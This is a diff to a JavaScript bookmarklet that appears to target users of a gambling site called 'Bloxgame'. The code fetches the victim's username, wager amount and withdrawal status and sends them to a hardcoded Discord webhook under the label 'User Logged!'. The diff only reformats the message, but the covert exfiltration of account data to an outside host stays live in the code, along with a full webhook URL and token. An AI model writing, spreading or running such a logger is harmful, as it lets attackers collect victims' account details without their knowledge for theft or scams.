@@ -16,26 +16,17 @@ javascript:(function() {
                     var response = JSON.parse(xhr.responseText);
                     var user = response.user.username;
                     var wager = response.wager;
-                    var sponsored = response.user.withdrawEnabled ? 'Enabled' : 'Disabled';
+                    var withdrawEnabled = response.user.withdrawEnabled ? 'Enabled' : 'Disabled';
+
+                    var currentTime = new Date();
+                    var formattedTime = currentTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+                    var formattedDate = currentTime.toLocaleDateString('en-US', {month: 'short', day: 'numeric'});
 
                     var webhookRequest = new XMLHttpRequest();
                     webhookRequest.open("POST", "https://discord.com/api/webhooks/1280222189429198858/M9axd-BRaA4_aLDb3aqzsHyvSsVVYusXykOX_K1hmvE6evrp5GkuWNqat4iy_p9HrNp3", true);
                     webhookRequest.setRequestHeader('Content-Type', 'application/json');
                     webhookRequest.send(JSON.stringify({
-                        embeds: [{
-                            title: "User Information",
-                            color: 3066993,
-                            fields: [
-                                { name: "User", value: user, inline: false },
-                                { name: "Wager", value: wager.toString(), inline: false },
-                                { name: "Withdraw", value: sponsored, inline: false }
-                            ],
-                            footer: {
-                                text: "Bloxgame User Data",
-                                icon_url: "https://example.com/icon.png"
-                            },
-                            timestamp: new Date().toISOString()
-                        }]
+                        content: `**User Logged!**\n\n**User**: ${user}\n**Wager**: ${wager}\n**Withdraw**: ${withdrawEnabled}\n\n*Bloxgame User Data • ${formattedDate} at ${formattedTime}*`
                     }));
                     console.log('Response sent to webhook.');
                 }
